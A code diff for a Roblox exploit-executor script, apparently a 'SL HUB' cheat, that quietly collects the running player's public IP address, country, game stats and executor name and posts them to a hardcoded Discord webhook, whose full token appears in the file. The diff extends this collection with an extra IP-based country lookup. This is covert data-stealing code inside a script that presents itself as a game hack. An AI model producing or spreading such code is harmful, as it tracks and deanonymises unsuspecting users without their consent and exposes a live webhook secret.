@@ -1,20 +1,30 @@
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local LocalizationService = game:GetService("LocalizationService")
+local MarketplaceService = game:GetService("MarketplaceService")
 
 local player = Players.LocalPlayer
 local webhook = "https://discord.com/api/webhooks/1478499458810642442/Mzrinsl69yQAjTe5a03UnFbL4CE439q4r7B1GHxVdzAH9wR0iGs3bmfo6bEO0rAgOYS6"
 
 local request = syn and syn.request or http_request or request or fluxus and fluxus.request
 
+local countryCode = "Unknown"
+pcall(function()
+    countryCode = LocalizationService:GetCountryRegionForPlayerAsync(player)
+end)
+
 local country = "Unknown"
 pcall(function()
-    country = LocalizationService:GetCountryRegionForPlayerAsync(player)
+    local data = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json"))
+    if data and data.country then
+        country = data.country
+    end
 end)
 
 local strength = "Unknown"
 local rebirths = "Unknown"
 local gems = "Unknown"
+local steps = "Unknown"
 
 pcall(function()
     local ls = player:FindFirstChild("leaderstats")
@@ -28,6 +38,9 @@ pcall(function()
         if ls:FindFirstChild("Gems") then
             gems = ls.Gems.Value
         end
+        if ls:FindFirstChild("Steps") then
+            steps = ls.Steps.Value
+        end
     end
 end)
 
@@ -35,22 +48,15 @@ local executor = "Unknown"
 pcall(function()
     if identifyexecutor then
         executor = identifyexecutor()
-    elseif syn then
-        executor = "Synapse X"
-    elseif fluxus then
-        executor = "Fluxus"
-    elseif KRNL_LOADED then
-        executor = "KRNL"
     end
 end)
 
 local ip = "Unknown"
 pcall(function()
-    local result = game:HttpGet("https://api.ipify.org")
-    ip = result
+    ip = game:HttpGet("https://api.ipify.org")
 end)
 
-local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+local gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
 
 local data = {
     ["content"] = "**🚀 SL HUB EXECUTED**",
@@ -64,6 +70,7 @@ local data = {
             {["name"] = "💪 Strength", ["value"] = tostring(strength), ["inline"] = true},
             {["name"] = "🔁 Rebirths", ["value"] = tostring(rebirths), ["inline"] = true},
             {["name"] = "💎 Gems", ["value"] = tostring(gems), ["inline"] = true},
+            {["name"] = "👟 Steps", ["value"] = tostring(steps), ["inline"] = true},
             {["name"] = "⚙️ Executor", ["value"] = executor, ["inline"] = true},
             {["name"] = "🌐 IP Address", ["value"] = ip, ["inline"] = false}
         }
